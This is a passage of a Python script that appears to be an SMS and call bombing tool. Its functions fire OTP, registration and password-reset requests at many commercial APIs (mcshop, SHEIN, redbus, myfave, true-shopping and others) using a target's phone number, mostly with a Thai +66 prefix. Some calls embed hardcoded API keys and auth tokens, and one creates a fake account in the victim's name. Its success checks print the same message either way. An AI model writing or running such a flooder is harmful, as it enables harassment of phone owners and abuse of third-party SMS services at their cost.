...
def API_2(): # mcshop.com
        try:
                jun=('username')
                req = requests.post("https://api.mcshop.com/cognito/me/register",headers={"x-store-token": "mcshop","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7","x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},json={"dob":"1902-02-02","email": name+"@gmail.com","firstname": name,"lastname": name,"gender":1,"password": password,"personalMobile": phone,"channelCode":"CO","marketingConsentVer":"v0.1","marketingConsent":1,"pdpaVer":"v0.1"})
                req1 = requests.post("https://api.mcshop.com/cognito/me/forget-password",headers={"x-store-token": "mcshop","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7","x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},json={"username": phone})
                if str(jun) in str(req.text):
                        print("\033[92m [ FONE ] {phone}")
                else:
                        print("\033[92m [ FONE ] {phone}")
...
def API_3(): # 
        try:
                jun=('phone')
                req = requests.post("https://www.pizza2night.co.uk/api/Account/RequestPhoneLoginCodeSms",data={"DeviceName":"Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","PhoneNumber":"+66"+phone})
                if str(jun) in str(req.text):
                        print("\033[92m [ FONE ] {phone}")
                else:
                        print("\033[92m [ FONE ] {phone}")
...
def API_4(): # PT-MAXCARD
        try:
                jun=('phone')
                req = requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
                if str(jun) in str(req.text):
                        print("\033[92m [ FONE ] {phone}")
                else:
                        print("\033[92m [ FONE ] {phone}")
...
def API_7(): # SHEIN
        try:
                ...
                headers={
                    "smdeviceid": "1487582755342",
                    "x-csrf-token": "V5QoyYSc-5vIAbVv7HGaqTFwz7E7POtIEDCQ",
                    "content-type": "application/x-www-form-urlencoded",
                    "x-requested-with": "XMLHttpRequest"
                    }
                req = requests.post("https://m.shein.com/ru/user/auth/sendcode?_ver=1.1.8&_lang=ru",headers=headers,data=data)
                if str(jun) in str(req.text):
                        print("\033[92m [ FONE ] {phone}")
                else:
                        print("\033[92m [ FONE ] {phone}")
...
def API_9(): # REDBUS
        try:
                jun=('phone')
                req = requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
                if str(jun) in str(req.text):
                        print("\033[92m [ FONE ] {phone}")
                else:
                        print("\033[92m [ FONE ] {phone}")
...
def API_10(): # call
	try:
		jun=('phone')
		req = requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone": "66"+phone})
		if str(jun) in str(req.text):
			print("\033[92m [ FONE ] {phone}")
		else:
			print("\033[92m [ FONE ] {phone}")
...
def API_11(): # True-Shopp
	try:
		jun=('phone')
		req = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username":phone})
		if str(jun) in str(req.text):
			print("\033[92m [ FONE ] {phone}")
		else:
			print("\033[92m [ FONE ] {phone}")
...
def API_13(): # EZYPLAY
	try:
		jun=('phone')
		req = requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
		if str(jun) in str(req.text):
			print("\033[92m [ FONE ] {phone}")
		else:
			print("\033[92m [ FONE ] {phone}")
...
def API_15():
	try:
		...
		if str(jun) in str(req.text):
			print("\033[92m [ FONE ]  ERROR HACKER")
		else:
			print("\033[92m [ FONE ]  ERROR HACKER")
	except: pass
